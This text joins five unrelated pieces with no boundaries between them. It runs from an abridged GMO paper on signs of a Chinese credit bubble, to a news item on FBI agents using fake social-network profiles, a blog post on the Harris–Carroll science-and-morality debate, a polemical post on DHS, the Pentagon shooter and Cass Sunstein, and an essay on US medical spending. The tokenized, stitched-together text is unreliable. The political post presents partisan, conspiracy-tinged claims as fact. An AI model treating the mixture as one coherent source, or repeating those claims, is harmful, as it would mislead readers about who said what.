Inquiring minds are reading a GMO white paper on China ’s Red Flags
In the aftermath of the credit crunch , the outlook for most developed economies appears pretty bleak .
Households need to deleverage .
Western governments will have to tighten their purse strings .
Faced with such grim prospects at home , many investors are turning their attention toward China .
It ’s easy to see why they are excited .
China combines size – 1.3 billion inhabitants – with tremendous growth prospects .
Current income per capita is roughly one - tenth of U.S. levels .
The People ’s Republic also has a great track record .
Over the past thirty years , China ’s Gross Domestic Product has increased sixteen - fold .
So what ’s the catch ?
The trouble is that China today exhibits many of the characteristics of great speculative manias .
The aim of this paper is to describe the common features of some of the great historical bubbles and outline China ’s current vulnerability .
Past manias and financial crises have shared many common characteristics .
Below is an attempt to list ten aspects of great bubbles over the past three centuries .
1. Great investment debacles generally start out with a compelling growth story .
This may be attached to some revolutionary new technology , such as railways in the nineteenth century , radio in the 1920s , or more recently the Internet .
Even when the new technology is for real , prospective rates of growth may beexaggerated .
Early growth spurts are commonly extrapolated into the distant future .
....
2 . A blind faith in the competence of the authorities is another typical feature of a classic mania .
In the 1920s , investors believed that the recently established Federal Reserve had brought an end to “ boom and bust . ”
A similar argument was trotted out in the mid-1990s when it was widely believed that the Greenspan Fed had succeeded in taming the business cycle .
The “ New Paradigm ” disappeared in the bear market of the new millennium .
It was soon replaced with the “ Great Moderation ” thesis of Ben Bernanke , which suggested that high levels of mortgage debt made sense because monetary policymaking was so vastly improved .
...
3 . A general increase in investment is another leading indicator of financial distress .
Capital is generally misspent during periods of euphoria .
Only during the bust does the extent of the misallocation become clear .
As the nineteenth century economist John Mills observed : “ Panics do not destroy capital ; they merely reveal the extent to which it has been previously destroyed by its betrayal in hopelessly unproductive works . ” ...
4. Great booms are invariably accompanied by a surge in corruption .
...
5 . Strong growth in the money supply is another robust leading indicator of financial fragility .
Easy money lies behind all great episodes of speculation from the Tulip Mania of the 1630s – which was funded with IOUs – onward .
...
6 . Fixed currency regimes often produce inappropriately low interest rates , which are liable to feed booms and end in busts .
This lesson was ignored by the creators
of the European Monetary Union , which brought low rates and real estate booms to its smaller members , Spain and Ireland .
....
7. Crises generally follow a period of rampant credit growth .
In the boom , liabilities are contracted that cannot subsequently be repaid .
...
8. Moral hazard is another common feature of great speculative manias .
Credit booms are often taken to extremes due to a prevailing belief that the authorities wo n’t let bad things happen to the financial system .
...
9 . A rising stock of debt is not the only cause for concern .
The economist Hyman Minsky observed that during periods of prosperity , financial structures become
precarious .
Investments financed with borrowed money do n’t generate enough income to either service or repay the loan ( what Minsky called “ Ponzi finance ” ) .
...
10 .
Dodgy loans are generally secured against collateral , most commonly real estate .
Thus , a combination of strong credit growth and rapidly rising property prices are a reliable leading indicator of very painful busts .
...
1. The China Dream .
For centuries , foreigners have pondered how to make money from China ’s vast population .
Today , the China Dream is more vivid than ever .
The People ’s Republic has more than 1.3 billion citizens , making it the world ’s most populous nation .
China ’s rural population is gradually moving into its cities .
A further 300 million country - dwellers – that ’s roughly the same size as the U.S. population – are expected to head toward towns and cities over the next decade .
It is generally assumed that the Chinese economy will continue to grow by around 8 % annually in the coming years .
...
2.In the Communist Party of China We Trust .
Twenty years ago , it was argued that “ Japan is different ” and that Tokyo ’s economic policies were better than the West’s .
A number of best - selling books lauded the land of the rising sun .
One bore the infamous title , Japan as Number One .
Today , similar claims are made about the singularity of the Chinese economy and the superiority of Beijing ’s policies .
And similar expectations are entertained about China ’s inexorable march to economic primacy .
3. Investment Boom .
In a market - oriented economy , investment might be expected to fall during a period of uncertainty and economic turbulence .
Yet in 2009 , Chinese fixed asset investment climbed by 30 % and contributed 90 % of last year ’s economic growth .
Investment rose to a record 58 % of GDP .
These are remarkable figures .
The key question is : how well was this money spent ? ....
4. Corruption .
All great speculative manias have been accompanied by rising levels of fraud .
Only in the bust do we get to see the full extent of the “ bezzle , ” as the Enrons , WorldComs , and Madoffs come to light .
The upturn in China ’s property and infrastructure spending , however , provides a cyclical spur to malfeasance .
The People ’s Republic recently slipped to 79th place in Transparency International ’s 2009 Corruption Perceptions Index , just below Burkina Faso .
....
5. Easy Money .
Nobel laureate Friedrich Hayek differed from his great rival J.M. Keynes .
While the latter argued that bubbles were the result of turbulent “ animal spirits , ” Hayek claimed that asset price inflation followed from excessively low interest rates .
Easy money , said Hayek , fed through to monetary and credit expansion , leading to inflation , either in the general price level or in asset prices .
...
6. The Fixed Exchange Rate and Capital Inflows .
The Chinese currency , the renminbi , is pegged to the U.S. dollar .
An undervalued exchange rate has boosted exports and kept interest rates low .
It has also encouraged massive capital inflows , mostly in the form of foreign direct investment .
Capital controls have limited inflows of hot money , although speculative inflows have picked up recently .
...
7. The Credit Boom .
In response to the global financial crisis and the collapse of export orders , Beijing ordered its banks to go out and lend .
Last year , new bank lending increased by nearly RMB 10 trillion , a sum equivalent to 29 % of GDP .
These loans largely went to fund infrastructure projects , property developments , and state - owned enterprises in a number of industries .
It was as if the economy had received an enormous adrenaline shot .
What most analysts fail to consider is the hangover that generally follows a credit binge .
8. Moral Hazard .
The major Chinese banks are controlled by the state .
They have a history of poor lending decisions .
...
9. Risky Lending Practices . ....
No one can gauge the robustness of the credit system since Chinese banks appear particularly reluctant to report problematic loans .
Ernst &
Young published a 2006 report that estimated non-performing loans ( NPLs ) at $ 900 billion .
This report was subsequently withdrawn .
NPLs continued to decline in 2008 even as the stock market imploded and exports crashed .
Fitch has suggested Chinese banks have been rolling over , or “ ever - greening , ” problematic loans .
Bank employees have their own reasons for burying bad loans .
A loan officer who reports problem debts is liable to have his salary reduced to below that of a migrant worker .
Few seem to care about the practice of concealing nonperforming loans since it ’s generally assumed that so long as the economy continues growing quickly , bad credits will turn good over time .
10 . The Bubble .
Surging credit has revived the animal spirits of Chinese investors .
The Shanghai stock market recovered sharply in the first half of last year .
On a single day in late July , turnover of “ A - shares ” in Shanghai exceeded the combined trading of the New York , London , and Tokyo stock exchanges .
Chinese IPOs accounted for nearly two - thirds of global issuance by market value in the third quarter of last year .
Chinese companies accounted for seven of the ten largest IPOs in the world .
New issues were often massively oversubscribed and saw huge first day “ pops . ”
The Field of Dreams
Three years ago , Premier Wen described China ’s economy as “ unstable , unbalanced , uncoordinated and unsustainable . ”
The Great Recession has n’t cured these imbalances .
Rather , China ’s ensuing investment and credit booms exacerbated them .
The real estate market displays the classic symptoms of a bubble – stretched valuations , rampant speculation , and frenzied new construction .
Sooner or later , this
bubble will burst .
In the past , whenever an economy has exhibited the 10 red flags listed in this paper there has been an unpleasant outcome .
Forecasting the end game is no easy task since speculative bubbles can run to extremes .
It ’s made more difficult in this case by the fact that China is not a pure market economy .
Stateowned enterprises can be called upon to prop up markets .
Losses may be concealed or shuffled around like a shell game , as has happened in the past .
Such measures , however , wo n’t cure China ’s problems .
They only delay the dénouement .

Any criminals dumb enough to brag about their exploits on social networking sites have now been warned : the next Facebook " friend " who contacts you may be an FBI agent .
US federal law enforcement agents have been using social networking sites ‑ including Facebook , LinkedIn , MySpace and Twitter ‑ to search for evidence and witnesses in criminal cases , and in some instances , track suspects , according to a newly released justice department memo .
FBI agents have created fake personalities ‑ in apparent contravention of some of the sites ' rules ‑ in order to befriend suspects and lure them into revealing clues or confessing , access private information and map social networks .
The new online efforts were revealed in a justice department document obtained by the Electronic Frontier Foundation , a San Francisco - based legal advocacy group .
The document , a 33 - page slideshow prepared by two justice department lawyers , was obtained in a lawsuit the group filed against the justice department , seeking information on its social network policies .
Law enforcement agencies have long used internet chatrooms to lure child pornography traffickers and suspected sex predators and with a warrant , can seize suspects and defendants ' email records .
But Facebook , MySpace and other social networking sites provide a wealth of additional information , in photographs , status updates and friend lists .
In many cases , the information is publicly accessible .
In a section entitled " utility in criminal cases " , the document says agents can scan suspects ' profiles to establish motives , determine a person 's location , and tap into personal communication , for instance through Facebook status updates .
Agents can examine photographs for guns , jewellery and other evidence of participation in robbery or burglary , and can compare information on Facebook status updates and Twitter feeds with suspects ' alibis .
Friend lists can yield witnesses or informants .
The document advises agents that Facebook is now used in private background checks .
It indicates that Facebook often co-operates with emergency law enforcement requests .
In one section on working undercover on social networking sites , the document poses but does not answer the question : " If agents violate terms of service , is that ' otherwise illegal activity ' ? "
Facebook rules bar users from providing false information or creating an account for anyone other than yourself without permission , and says that users should " provide their real names " .
A former US cyber - security prosecutor told the Associated Press that federal investigators working online should be able to go undercover as much as they do in the real world , but said rules need to be developed .
" This new situation presents a need for careful oversight so that law enforcement does not use social networking to intrude on some of our most personal relationships , " Marc Zwillinger said .
In one case that highlights the use of social networking in law enforcement , a man wanted in Seattle on bank fraud charges fled and police lost track of him .
The suspect 's Facebook page was private but his friend list was public .
Among Maxi Sopo's friends , prosecutors spotted a former justice department employee who did not know he was wanted .
When Sopo posted messages on Facebook describing his easy new life in Mexico , his online friend provided information that enabled Mexican police to nab him in September .
Sam Harris vs. Sean Carroll on Science and Morality
Several readers have asked me to comment on a recent talk given by Sam Harris entitled “ Science can answer moral questions . ”
Physicist Sean Carroll rebuffed Harris , saying :
There is a old saying , going back to David Hume , that you ca n’t derive ought from is .
And Hume was right !
You ca n’t derive ought from is .
Yet people insist on trying .
Harris replied here , though his full argument will arrive later this year in The Moral Landscape : How Science Can Determine Human Values .
What can we make of this debate ?
Let me offer a few brief thoughts .
First ,
Hume never said you ca n’t derive an ought statement from an is statement .
What he did say is that nobody up to his day had explained how to derive an ought from an is .
And it does seem like a difficult problem .
It is n’t obvious that “ Rape is a cause of suffering ” necessarily implies “ Therefore , we ought not rape . ”
These appear to be two fundamentally different kinds of claims .
But the mere appearance of a gap between ought and is does not prove anything .
John Searle gave a famous counter - example to the apparent is - ought gap :
Jones said , “ I promise to give you , Smith , five dollars . ”
Jones promised to give Smith five dollars .
Jones undertook an obligation to give Smith five dollars .
Jones is under an obligation to give Smith five dollars .
Jones ought to pay Smith five dollars .
Now it looks like we have logically and uncontroversially derived an ought from an is .
My point is only that Hume did not end the discussion on ought and is .
This is a hotly debated topic .
In fact , if I had to guess , I would guess that most philosophers today think you can derive an ought from an is .
But Carroll does not believe in objective morality :
There are not objective moral truths ( where “ objective ” means “ existing independently of human invention ” ) , but there are real human beings with complex sets of preferences .
What we call “ morality ” is an outgrowth of the interplay of those preferences with the world around us , and in particular with other human beings .
The project of moral philosophy is to make sense of our preferences , to try to make them logically consistent , to reconcile them with the preferences of others and the realities of our environments , and to discover how to fulfill them most efficiently .
If I had read that last sentence in isolation , I might have thought Carroll was endorsing the theory of objective moral realism I defend : desirism .
And anyway , the facts about which sets of preferences are logically consistent , and the facts about which sets of preferences reconcile most efficiently with the preferences of others and the realities of our environments – are n’t these “ moral ” truths that exist “ independently of human invention ” ?
It would seem so .
But the central question here is how we define moral terms , as Harris recognizes :
[ Many ] people strongly objected to my claim that values ( and hence morality ) relate to facts about the wellbeing of conscious creatures .
My critics seem to think that [ while ] maximizing the wellbeing of conscious creatures may be what I value , other people are perfectly free to define their values differently , and there will be no rational or scientific basis to argue with them .
Thus , by starting my talk with the assertion that values depend upon actual or potential changes in consciousness , and that some changes are better than others , I merely assumed what I set out to prove .
This is what philosophers call “ begging the question . ”
After a few misguided swipes at Hume and Carroll , Harris gets back on topic :
I believe that we can know , through reason alone , that consciousness is the only intelligible domain of value .
What ’s the alternative ?
Imagine some genius comes forward and says , “ I have found a source of value / morality that has absolutely nothing to do with the ( actual or potential ) experience of conscious beings . ”
Take a moment to think about what this claim actually means .
Here ’s the problem : whatever this person has found cannot , by definition , be of interest to anyone ( in this life or in any other ) .
Put this thing in a box , and what you have in that box is – again , by definition – the least interesting thing in the universe .
Harris is expressing a popular philosophical view that value supervenes on brain states .
To say that something has value and yet is not valued by any being is just a confusion , Harris thinks .
So Harris ’ central claim is that terms about moral value refer to brain states .
And since science can tell us a great deal about brain states , and about how actions and desires and policies affect brain states , therefore science can tell us which actions and desires and policies are morally right and wrong .
Carroll ’s reply is that science cannot show us that terms about moral value refer to brain states .
Science cannot tell us that ought is derived from facts about brains states .
Why not say that moral value is grounded in intrinsic value , or rights and duties , or God ’s commands ?
What are the data we can point to in order to adjudicate this disagreement ?
… How are we to balance individual rights against the collective good ?
You can do all the experiments you like and never find an answer to that question …
When [ people ] do n’t share values , there ’s no way to show that one of the parties is “ objectively wrong . ”
Unfortunately , Harris clouds the issue with some emotional bludgeoning , as if he were William Lane Craig giving the moral argument for God ’s existence :
There are women and girls getting their faces burned off with acid at this moment for daring to learn to read , or for not consenting to marry men they have never met , or even for the crime of getting raped .
Look into their eyes , and tell me that what has been done to them is the product of an alternative moral code every bit as authentic and philosophically justifiable as your own .
But of course Carroll hates these cruelties .
And of course it ’s not that he thinks all moral codes are equal , he just does n’t think any of them are objectively true .
I will not try to argue who is right or wrong in this debate .
Rather , I will try to clarify the debate by drawing attention to the questions that matter .
First , how do we define moral terms ?
Is Harris justified in saying that moral terms are most reasonably defined in reference to brain states , or is it just as justified to define moral terms in other common ways , for example in reference to universal maxims or hypothetical social contracts ?
How can we go about answering such a question ?
Will a dictionary settle the matter , or is it more complicated than that ?
Second , if Harris can reasonably define moral terms in reference to brain states , is his more specific definition of moral terms in reference to the wellbeing of conscious beings justified ?
Why “ wellbeing ” ?
Why only conscious beings ?
In exploring these two questions about the meaning of moral terms , my interviews with Don Loeb , Stephen Finlay , Ruth Chang and Alonzo Fyfe may be of use .
If these two sets of questions are granted in Harris ’ favor , then Harris and Carroll will agree that science has much to say about which actions , desires , and policies promote the wellbeing of conscious beings .
That is not disputed .
Of course , Carroll is right that science cannot tell us what the “ correct ” definition of morality is .
Even Harris seems to concede this is the domain of “ reason alone . ”
But this might be a trivial concession for Harris to make .
After all , science cannot say anything about protons until we have settled on the definition of “ proton . ”
It does not diminish the scientific nature of proton - study to point out that science itself cannot determine the correct definition of the word “ proton . ”
Likewise , perhaps the scientific nature of morality is not diminished by the fact that science itself cannot determine the correct definition for “ morally good . ”

Janet Napolitano and the DHS are now vindicated .
The mentally disturbed Pentagon shooter is more evidence of rightwing extremism violence .
Or so Bill Weir of ABC News insists .
The corporate media “ journalist ” ( teleprompter reader ) and co-anchor of Good Morning America Weekend Edition waved around a printout out of the DHS report this morning .
“ Back in April , almost a year ago , the Department of Homeland Security put out this assessment , called ‘ Rightwing Extremism : Current Economic and Political Climate Fueling Resurgence in Radicalization and Recruitment . ’
And the title alone stirred up a political firestorm for the Secretary , Napolitano .
She apologized , had to reaffirm that the government does n’t monitor people who are opposed to this administration .
But as a law enforcement officer , how do you make the distinction between somebody who has a legitimate different point of view from this government and someone who might become unhinged ? ”
Weir said .
See the video :
The Bedell case has become a circus sideshow and reaffirms the false right - left paradigm .
Neocon Republicans insist Bedell was a registered Democrat while so - called liberals and progressives argue he was a poster child for the Tea Party and “ militia ” movements .
“ As we saw in Austin , far - right extremist rhetoric plays no small role in inspiring these acts .
And inevitably , it is ordinary Americans who pay the price , ” writes David Neiwert for Crooks and Liars .
“ We now know that the guy thought the government and the Bush family were behind the 9/11 attacks ( or ‘ demolitions ’ as he called them ) , and was basically frothing at the mouth with Bush hatred , ” writes a blogger going by the handle Zombie on the neocon Pajamas Media website .
Zombie , to his credit , says that more than anything Bedell was a lunatic .
Meanwhile , one of his neocon comrades , the Fox News darling Michelle Malkin , ca n’t help but note Bedell was a registered Democrat .
A d v e r t i s e m e n t
{openx:49}
The CIA ’s favorite newspaper has weighed in .
Bedell , Joe Stack , and James Von Brunn , the elderly neo -Nazi charged with killing a guard at the U.S. Holocaust Museum last June , “ appear to have drawn ideological nourishment from the same well : online communities of like - minded people who validate and amplify extreme views .
Today , more than in recent years , such communities are tapping into a broad undercurrent of anti-government discontent fueled by economic recession , joblessness and concern over the growing federal deficit , according to experts who have studied the phenomenon , ” write Joby Warrick and Spencer S. Hsu for The Washington Post .
How to put a damper on this electronic undercurrent “ anti- government discontent ” ?
Clamp down on the internet , of course .
Cass Sunstein to the rescue .
In his recently published book , On Rumors , Obama ’s regulatory czar suggests websites be forced to remove “ false rumors ” ( as determined by the government ) or face prosecution under libel laws .
In an academic paper , Sunstein argued that the government should ban conspiracy theories and launch a renewed COINTELPRO initiative and infiltrate “ extremists who supply conspiracy theories ” and unconstitutionally disrupt anybody who disagrees with the government .
“ We can readily imagine a series of possible responses , ” Sunstein wrote .
“ (1 ) Government might ban conspiracy theorizing .
( 2 ) Government might impose some kind of tax , financial or otherwise , on those who disseminate such theories . ”
Sunstein ’s over - the - top fascist solutions in response to people who oppose the government are probably a bit too extreme for the squeamish gang in Congress .
Instead , they appear ready to support a bill now in the Senate that will give Obama the power to shut down the internet in response to a cyber attack .
As Boston Review journalist Evgeny Morozov noted last year , the cyber war threat is seriously overblown .
“ It is alarming that so many people have accepted the White House ’s assertions about cyber - security as a key national security problem without demanding further evidence , ” writes Morozov .
“ Have we learned nothing from the WMD debacle ?
The administration ’s claims could lead to policies with serious , long - term , troubling consequences for network openness and personal privacy . ”
Any legislation emerging in the weeks ahead will be designed to go after “ online communities of like - minded people who validate and amplify extreme views , ” not Muslim hackers secreted away in remote caves .

Since the end of World War II , the provision of medical care in the United States and other advanced countries has displayed three major features : first , rapid advance in the science of medicine ; second , large increases in spending , both in terms of inflation - adjusted dollars per person and the fraction of national income spent on medical care ; and third , rising dissatisfaction with the delivery of medical care , on the part of both consumers of medical care and physicians and other suppliers of medical care .
Rapid technological advance has occurred repeatedly since the industrial revolution – in agriculture , steam engine , railroad , telephone , electricity , automobile , radio , television , and , most recently , computers and telecommunication .
The other two features seem unique to medicine .
It is true that spending initially increased after nonmedical technical advances , but the fraction of national income spent did not increase dramatically after the initial phase of widespread acceptance .
On the contrary , technological development lowered cost , so that the fraction of national income spent on food , transportation , communication , and much more has gone down , releasing resources to produce new products or services .
Similarly , there seems no counterpart in these other areas to the rising dissatisfaction with the delivery of medical care .
I. International comparison
These developments in medicine have been worldwide .
By their very nature , scientific advances know no geographical boundaries .
Data on spending are readily available for 29 Organization for Economic Cooperation and Development ( OECD ) countries .
In every one , medical spending has gone up both in inflation - adjusted dollars per person and as a fraction of national income .
Data are available for both 1960 and 1997 for 21 countries .
In 13 , spending more than doubled as a fraction of gross domestic product .
The smallest increase was 67 percent , the largest , 378 percent .
In 1997 , 16 of the 29 OECD countries spent between 7 percent and 9 percent of gross domestic product on medical care .
The United States spent 14 percent , the highest of any OECD country .
Germany was a distant second at 11 percent ;
Turkey was the lowest at 4 percent .
A key difference between medical care and the other technological revolutions is the role of government .
In other technological revolutions , the initiative , financing , production , and distribution were primarily private , though government sometimes played a supporting or regulatory role .
In medical care , government has come to play a leading role in financing , producing , and delivering medical service .
Direct government spending on health exceeds 75 percent of total health spending for 15 OECD countries .
The United States is next to the lowest of the 29 countries , at 46 percent .
In addition , some governments indirectly subsidize medical care through favorable tax treatment .
For the United States , such subsidization raises the fraction of health spending financed directly or indirectly by government to over 50 percent .
What are countries getting for the money they are spending on medical care ?
What is the relation between input and output ?
Spending on medical care provides a reasonably good measure of input , but , unfortunately , there is no remotely satisfactory objective measure of output .
For the hospital segment , number of beds occupied may at first seem like an objective measure .
However , improvements in medicine have included a reduction in the length of hospital stay required for various medical procedures or illnesses .
So , fewer patient days may be a sign of greater , not lesser , output .
The desired output of medical care is “ good health . ”
But how can we quantify “ good health , ” and equally important , allow for the role that factors other than medical care – such as plentiful food , pure water , and protective clothing – play in producing “ good health ” ?
The least objectionable measure I have been able to find is expected length of life at birth or at various later ages , though that too is a far from unambiguous measure of the output attributable to spending on medical care .
The remarkable increase in life span in advanced countries during the past century reflects much more than spending on medical care proper .
Moreover , it does not allow for changes in the quality of life - attempted measurement of which is still in its infancy .
Figure 1 ( see Appendix ) shows the relation in 1996 for the 29 OECD countries between the percentage of the gross domestic product spent on medical care and the expected length of life at birth for females .
1
The relation is clearly positive , though very loose .
2 The United States and Germany are clear outliers , ranking first and second in spending but twentieth and seventeenth in length of life .
As another indication of looseness , nine countries spent between 7 and 8 percent of GDP on medicine .
The group includes Japan , which has the highest expected length of life ( 83.6 years ) , and the Czech Republic , fourth from the bottom ( 77.3 years ) .
Clearly , many factors other than spending on medical care affect expected length of life .
Exploring that relation more fully , however worthwhile a project , is not the purpose of this article , which is to examine the situation in the United States .
I have presented the data on the OECD countries primarily to document the two ( related ? ) respects in which the United States is an outlier :
We spend a higher percentage of national income on medical care ( and more per capita ) than any other OECD country , and government finances a smaller fraction of that spending than all except Korea .
II .
Why third - party payment ?
Two simple observations are key to explaining both the high level of spending on medical care and the dissatisfaction with that spending .
The first is that most payments to physicians or hospitals or other caregivers for medical care are made not by the patient but by a third party – an insurance company or employer or governmental body .
The second is that nobody spends somebody else ’s money as wisely or as frugally as he spends his own .
These statements apply equally to other OECD countries .
They do not by themselves explain why the United States spends so much more than other countries .
No third party is involved when we shop at a supermarket .
We pay the supermarket clerk directly .
The same for gasoline for our car , clothes for our back , and so on down the line .
Why , by contrast , are most medical payments made by third parties ?
The answer for the United States begins with the fact that medical - care expenditures are exempt from the income tax if , and only if , medical care is provided by the employer .
If an employee pays directly for medical care , the expenditure comes out of the employee ’s income after income tax .
If the employer pays for the employee ’s medical care , the expenditure is treated as a tax - deductible expense for the employer and is not included as part of the employee ’s income subject to income tax .
That strong incentive explains why most consumers get their medical care through their employer or their spouse ’s or their parents ’ employer .
In the next place , the enactment of Medicare and Medicaid in 1965 made the government a third - party payer for persons and medical care covered by those measures .
We have become so accustomed to employer - provided medical care that we regard it as part of the natural order .
Yet it is thoroughly illogical .
Why single out medical care ?
Food is more essential to life than medical care .
Why not exempt the cost of food from taxes if provided by the employer ?
Why not return to the much - reviled company store when workers were in effect paid in kind rather than in cash ?
The revival of the company store for medicine has less to do with logic than pure chance .
It is a wonderful example of how one bad government policy leads to another .
During World War II , the government financed much wartime spending by printing money while , at the same time , imposing wage and price controls .
The resulting repressed inflation produced shortages of many goods and services , including labor .
Firms competing to acquire labor at government - controlled wages started to offer medical care as a fringe benefit .
That benefit proved particularly attractive to workers and spread rapidly .
Initially , employers did not report the value of a fringe benefit to the Internal Revenue Service as part of their workers ’ wages .
It took some time before the IRS realized what was going on .
When it did , it issued regulations requiring employers to include the value of medical care as part of reported employees ’ wages .
By this time , workers had become accustomed to the tax exemption of that particular fringe benefit and made a big fuss .
Congress responded by legislating that medical care provided by employers should be tax - exempt .
III .
Effect of third - party payment on medical costs
The tax exemption of employer - provided medical care has two different effects , both of which raise health costs .
First , it leads employees to rely on their employer , rather than themselves , to make arrangements for medical care .
Yet employees are likely to do a better job of monitoring medical - care providers , because it is in their own interest , than is the employer or the insurance company or companies designated by the employer .
Second , it leads employees to take a larger fraction of their total remuneration in the form of medical care than they would if spending on medical care had the same tax status as other expenditures .
If the tax exemption were removed , employees could bargain with their employers for a higher take - home pay in lieu of medical care and provide for their own medical care either by dealing directly with medical - care providers or by purchasing medical insurance .
Removal of the tax exemption would enable governments to reduce the tax rate on income while raising the same total revenue .
This hidden subsidy for medical care , currently more than $ 100 billion a year , is not included in reported figures on government health spending .
Extending the tax exemption to all medical care – as in the current limited provision for medical savings accounts and the proposals to make such accounts more widely available – would reduce reliance on third - party payment .
But , by extending the hidden subsidy to all medical - care expenditures , it would increase the tendency of employees to take a larger portion of their remuneration in the form of medical care .
( I will more fully discuss medical savings accounts in the conclusion . )
Enactment of Medicare and Medicaid provided a direct subsidy for medical care .
The cost grew much more rapidly than originally estimated – as the cost of all handouts invariably do .
Legislation cannot repeal the non-legislated law of demand and supply .
The lower the price , the greater the quantity demanded ; at a zero price , the quantity demanded becomes infinite .
Some method of rationing must be substituted for price and that invariably means administrative rationing .
Figure 2 provides an estimate of the effect on medical costs of tax exemption and the subsequent enactment of Medicare and Medicaid .
The top line in the chart is actual per capita spending on medical care expressed in constant 1992 prices , to allow for the effect of inflation .
Spending multiplied more than 23 - fold from 1919 to 1997 , going from $ 155 per capita to $ 3,625 .
The bottom line shows what would have happened to per capita spending if it had continued to rise at the same rate as it did from 1919 to 1940 ( 3.1 percent per year ) .
On that assumption , per capita spending would have risen to $ 1,751 , instead of $ 3,625 by 1997 , or less than half as much .
3,4
To estimate the separate effects of tax exemption and of Medicare and Medicaid , the second line shows what would have happened to spending if , after Medicare and Medicaid were enacted , spending had continued to rise at the same rate as it did from 1946 to 1965 ( 4 percent per year ) .
The segment between the two bottom lines shows the effect of tax exemption ; the segment between the two top lines shows the effect of the enactment of Medicare and Medicaid .
According to these estimates , tax exemption accounts for 57 percent of the increase in cost ; Medicare and Medicaid , 43 percent .
Figure 3 presents a different breakdown of the cost of medical care : between the part paid directly by the government and the part paid privately .
As the figure shows , the government share has been growing over the whole period .
Government ’s share went from one - eighth of the total in 1919 to nearly a quarter in 1946 to a quarter in 1965 to nearly half in 1997 .
The rise in the government ’s share has been accompanied by centralization of spending – from primarily by state and local governments to primarily by the federal government .
We are headed toward completely socialized medicine and are already halfway there , if in addition to direct costs , we include indirect tax subsidies .
Expressed as a fraction of national income , spending on medical care went from 3 percent of the national income in 1919 to 4.5 percent in 1946 , to 7 percent in 1965 to a mind - boggling 17 percent in 1997.5
No other country in the world approaches that level of spending as a fraction of national income no matter how its medical care is organized .
The change in the role of medical care in the U.S. economy is truly breathtaking .
To illustrate , in 1946 , seven times as much was spent on food , beverages , and tobacco as on medical care ; in 1996 , 50 years later , more was spent on medical care than on food , beverages , and tobacco .
In 1946 , twice as much was spent on transportation as on medical care ; in 1996 , one - and - a - half times as much was spent on medical care as on transportation .
IV .
The changing meaning of insurance
Employer financing of medical care has caused the term “ insurance ” to acquire a rather different meaning in medicine than in most other contexts .
We generally rely on insurance to protect us against events that are highly unlikely to occur but involve large losses if they do occur – major catastrophes , not minor regularly recurring expenses .
We insure our houses against loss from fire , not against the cost of having to cut the lawn .
We insure our cars against liability to others or major damage , not against having to pay for gasoline .
Yet in medicine , it has become common to rely on insurance to pay for regular medical examinations and often for prescriptions .
This is partly a question of the size of the deductible and the co-payment , but it goes beyond that .
“ Without medical insurance ” and “ without access to medical care ” have come to be treated as nearly synonymous .
Moreover , the states and the federal government have increasingly specified the coverage of insurance for medical care to a detail not common in other areas .
The effect has been to raise the cost of insurance and to limit the options open to individuals .
Many , if not most , of the “ medically uninsured ” are persons who for one reason or another do not have access to employer - provided medical care and are not willing to pay the cost of the only kinds of insurance contracts available to them .
If tax exemption for employer - provided medical care and Medicare and Medicaid had never been enacted , the insurance market for medical care would probably have developed as other insurance markets have .
The typical form of medical insurance would have been catastrophic insurance – i.e. , insurance with a very high deductible .
V. Bureaucratization and Gammon ’s Law
Third - party payment has required the bureaucratization of medical care and , in the process , has changed the character of the relation between physicians or other caregivers and patients .
A medical transaction is not simply between a caregiver and a patient ; it has to be approved as “ covered ” by a bureaucrat and the appropriate payment authorized .
The patient , the recipient of the medical care , has little or no incentive to be concerned about the cost – since it ’s somebody else ’s money .
The caregiver has become , in effect , an employee of the insurance company or , in the case of Medicare and Medicaid , the government .
The patient is no longer the one , and the only one , the caregiver has to serve .
An inescapable result is that the interest of the patient is often in direct conflict with the interest of the caregiver ’s ultimate employer .
That has been manifest in public dissatisfaction with the increasingly impersonal character of medical care .
Some years ago , the British physician Max Gammon , after an extensive study of the British system of socialized medicine , formulated what he called “ the theory of bureaucratic displacement . ”
In Health and Security , he observed that in “ a bureaucratic system … increase in expenditure will be matched by fall in production … .
Such systems will act rather like ‘ black holes , ’ in the economic universe , simultaneously sucking in resources , and shrinking in terms of ’ emitted production . ' ”
Gammon ’s observations for the British system have their exact parallel in the partly socialized U.S. medical system .
Here too input has been going up sharply relative to output .
This tendency can be documented particularly clearly for hospitals , thanks to the availability of high quality data for a long period .
Before 1940 , output , as measured by number of patient days per 1,000 population ( equal to the number of occupied beds per 1,000 population ) and input , as measured by cost per 1,000 population , both rose ( input somewhat more than output presumably because of the introduction of more sophisticated and expensive treatments ) .
The number of occupied beds per resident of the United States rose from 1929 to 1940 at the rate of 2.4 percent per year ; the cost of hospital care per resident , adjusted for inflation , at 5 percent per year ; and the cost per patient day , adjusted for inflation , at 2 percent per year .
The situation changed drastically after the war , as Figure 4 and the top part of Table 1 show .
From 1946 to 1996 , the number of beds per 1,000 population fell by more than 60 percent ; the fraction of beds occupied , by more than 20 percent .
In sharp contrast , input skyrocketed .
Hospital personnel per occupied bed multiplied nine - fold , and cost per patient day , adjusted for inflation , an astounding 40 - fold , from $ 30 in 1946 to $ 1,200 in 1996 ( at 1992 prices ) .
A major engine of these changes was the enactment of Medicare and Medicaid in 1965 .
A mild rise in input was turned into a meteoric rise ; a mild fall in output , into a rapid decline .
The 40 - fold increase in the cost per patient day was converted into a 13 - fold increase in hospital cost per resident of the United States by the sharp decline in output .
Hospital days per person per year were cut by two - thirds , from three days in 1946 to an average of less than a day by 1996 .
Taken by itself , the decline in hospital days is evidence of progress in medical science .
A healthy population needs less hospitalization , and advances in science and medical technology have reduced the length of hospital stays and increased outpatient surgery .
Progress in medical science may well explain most of the decline in output ; it does not explain much , if any , of the rise in input per unit of output .
True , medical machines have become more complex .
However , in other areas where there has been great technical progress – whether it be agriculture or telephones or steel or automobiles or aviation or , most recently , computers and the Internet – progress has led to a reduction , not an increase , in cost per unit of output .
Why is medicine an exception ?
Gammon ’s law , not medical miracles , was clearly at work .
The provision of medical care as an untaxed fringe benefit by employers , and then the federal government ’s assumption of responsibility for hospital and medical care of the elderly and the poor , provided a fresh pool of money .
And there was no shortage of takers .
Growing costs , in turn , led to more regulation of hospitals and medical care , further increasing administrative costs , and leading to the bureaucratization that is so prominent a feature of medical care today .
Medicine is not the only area where this pattern has prevailed .
Aside from defense and medicine , schooling is the only other major area of our society that is largely financed and administered by government , and here too Gammon ’s law has clearly operated .
Input per unit of output , however measured , has clearly been going up ; output , especially if measured in terms of quality , has been going down , and dissatisfaction , as in medicine , is growing .
The same may well be true also in defense .
However , measuring output independently of input is even more baffling for defense than for medicine .
